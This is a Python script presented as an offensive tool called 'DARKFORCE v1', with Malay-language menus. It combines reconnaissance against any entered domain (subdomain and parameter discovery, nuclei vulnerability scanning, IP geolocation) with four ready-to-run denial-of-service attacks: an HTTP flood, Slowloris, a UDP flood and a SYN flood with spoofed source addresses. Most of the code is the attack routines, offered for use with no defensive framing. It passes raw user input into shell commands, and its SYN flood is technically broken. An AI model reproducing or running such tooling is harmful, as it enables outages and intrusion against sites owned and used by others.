import os
import sys
import time
import socket
import threading
import random
from urllib.parse import urlparse
import subprocess

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print("\033[31m" + """
    ╔════════════════════════════════════════════╗
    ║         DARKFORCE v1 - Mryagami | DragonForce ║
    ║   Recon + Vuln Scanner + IP Grab + DDoS    ║
    ╚════════════════════════════════════════════╝
    \033[0m""")

def menu():
    clear()
    banner()
    print("\033[33m[RECON & SCAN]\033[0m")
    print("1. Dapat IP web + reverse IP lookup")
    print("2. Cari subdomain + parameter tersembunyi")
    print("3. Scan kelemahan cepat (httpx + nuclei)")
    print("4. Track location kasar IP")
    print("")
    print("\033[31m[DDoS]\033[0m")
    print("5. HTTP Flood (GET/POST)")
    print("6. Slowloris (low bandwidth)")
    print("7. UDP Flood")
    print("8. SYN Flood")
    print("")
    print("\033[90m0. Keluar\033[0m")
    print("")
    choice = input("\033[32mPilih [1-8]: \033[0m")

    if choice == "1":
        ip_grab()
    elif choice == "2":
        subdomain_param()
    elif choice == "3":
        vuln_scan()
    elif choice == "4":
        track_location()
    elif choice == "5":
        http_flood()
    elif choice == "6":
        slowloris()
    elif choice == "7":
        udp_flood()
    elif choice == "8":
        syn_flood()
    elif choice == "0":
        sys.exit(0)
    else:
        input("Pilihan salah. Tekan enter...")
        menu()

def ip_grab():
    clear()
    banner()
    target = input("\033[33mMasukkan domain (contoh: poloss.my.id): \033[0m")
    print("\nMendapatkan IP...\n")
    os.system(f"dig +short {target}")
    print("\nReverse IP lookup (buka manual):")
    print(f"https://viewdns.info/reverseip/?host={target}")
    input("\nTekan enter untuk balik menu...")
    menu()

def subdomain_param():
    clear()
    banner()
    target = input("\033[33mMasukkan domain (contoh: poloss.my.id): \033[0m")
    print("\nMencari subdomain...\n")
    os.system(f"subfinder -d {target} -all -silent -o sub_{target}.txt")
    print("\nMencari parameter tersembunyi...\n")
    os.system(f"paramspider -d {target} > params_{target}.txt")
    print(f"\nHasil disimpan: sub_{target}.txt & params_{target}.txt")
    input("\nTekan enter untuk balik menu...")
    menu()

def vuln_scan():
    clear()
    banner()
    target = input("\033[33mMasukkan URL atau domain: \033[0m")
    print("\nScanning kelemahan cepat...\n")
    os.system(f"httpx -u {target} -silent -sc -title -tech-detect")
    print("\nScanning vulnerability (nuclei)...\n")
    os.system(f"nuclei -u {target} -t cves/ -t vulnerabilities/ -o nuclei_{target}.txt")
    print(f"\nHasil nuclei: nuclei_{target}.txt")
    input("\nTekan enter untuk balik menu...")
    menu()

def track_location():
    clear()
    banner()
    ip = input("\033[33mMasukkan IP untuk track location: \033[0m")
    print("\nTracking...\n")
    os.system(f"curl -s http://ip-api.com/json/{ip} | jq .")
    input("\nTekan enter untuk balik menu...")
    menu()

def http_flood():
    clear()
    banner()
    target = input("\033[33mMasukkan URL target: \033[0m")
    threads = int(input("\033[33mJumlah threads (50-500): \033[0m") or 200)

    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((urlparse(target).hostname, 80))
                s.send(f"GET / HTTP/1.1\r\nHost: {urlparse(target).hostname}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode())
                s.close()
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()

    print(f"\033[31mHTTP Flood dimulai ke {target} ({threads} threads)\033[0m")
    while True:
        time.sleep(1)

def slowloris():
    clear()
    banner()
    target = input("\033[33mMasukkan host target: \033[0m")
    port = int(input("\033[33mPort (80/443): \033[0m") or 80)
    sockets = []
    count = 200

    def create_socket():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
        return s

    for _ in range(count):
        try:
            s = create_socket()
            sockets.append(s)
        except:
            pass

    print(f"\033[31mSlowloris dimulai ke {target}:{port} ({len(sockets)} sockets)\033[0m")

    while True:
        for s in list(sockets):
            try:
                s.send(b"X-a: b\r\n")
            except:
                sockets.remove(s)
                try:
                    s = create_socket()
                    sockets.append(s)
                except:
                    pass
        time.sleep(15)

def udp_flood():
    clear()
    banner()
    target_ip = input("\033[33mMasukkan IP target: \033[0m")
    port = int(input("\033[33mPort (0 = random): \033[0m") or random.randint(1, 65535))
    bytes_size = 1024
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(bytes_size)

    print(f"\033[31mUDP Flood dimulai ke {target_ip}:{port}\033[0m")

    while True:
        sock.sendto(bytes_data, (target_ip, port))

def syn_flood():
    clear()
    banner()
    target_ip = input("\033[33mMasukkan IP target: \033[0m")
    port = int(input("\033[33mPort target: \033[0m"))
    threads = int(input("\033[33mThreads (50-500): \033[0m") or 200)

    def syn():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
                src_port = random.randint(1024, 65535)
                s.bind((src_ip, src_port))
                s.sendto(b"\x00"*20, (target_ip, port))
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=syn)
        t.daemon = True
        t.start()

    print(f"\033[31mSYN Flood dimulai ke {target_ip}:{port}\033[0m")
    while True:
        time.sleep(1)

if __name__ == "__main__":
    menu()
